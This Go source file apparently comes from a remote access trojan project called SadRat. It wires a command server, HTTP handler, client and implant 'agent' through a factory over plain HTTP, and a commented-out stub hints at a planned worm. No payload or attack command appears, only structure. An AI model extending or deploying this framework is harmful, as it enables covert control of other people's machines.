package factory

import (
	"github.com/VitorDie/SadRat/internal/client"
	"github.com/VitorDie/SadRat/internal/agent"
	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/VitorDie/SadRat/internal/presentation"
	"github.com/VitorDie/SadRat/internal/service"
)

// RatFactoryHttp é a nossa fábrica concreta de HTTP em texto plano
type RatFactoryHttp struct {
	db        domain.ServerDBPlainData
	serverURL string
}

// NewRatFactoryHttp exige a Injeção de Dependência (O cofre de dados)
func NewRatFactoryHttp(db domain.ServerDBPlainData, serverURL string) *RatFactoryHttp {
	return &RatFactoryHttp{db: db, serverURL: serverURL}
}

// CreateServer (protected na sua modelagem) constrói o Repositório e injeta na Regra de Negócio
func (f *RatFactoryHttp) CreateServer() domain.Server {
	// A Fábrica HTTP usa o banco Plain Data
	// Retornamos a lógica (ConcreteServer) encapsulada na interface domain.Server
	return service.NewConcreteServer(f.db)
}

// CreateHandler (public) constrói a cadeia inteira chamando o CreateServer internamente!
func (f *RatFactoryHttp) CreateHandler() domain.Handler {
	// 1. A fábrica pede para si mesma construir o Server configurado
	server := f.CreateServer()

	// 2. Injeta o Server no Handler HTTP
	// Como HandlerHTTP possui o método Start(), ele automaticamente é um domain.Handler
	return presentation.NewHandlerHTTP(server)
}

// STUBS (Deixaremos preparados para quando criarmos os componentes)
func (f *RatFactoryHttp) CreateClient() domain.Client { 
	// Usamos a variável dinâmica da fábrica!
	return client.NewClientHTTP(f.serverURL)
}

func (f *RatFactoryHttp) CreateAgent() domain.Agent { 
	// Usamos a variável dinâmica da fábrica!
	return agent.NewAgentHTTP(f.serverURL)
}

// func (f *RatFactoryHttp) CreateWorm() domain.Worm { return nil }
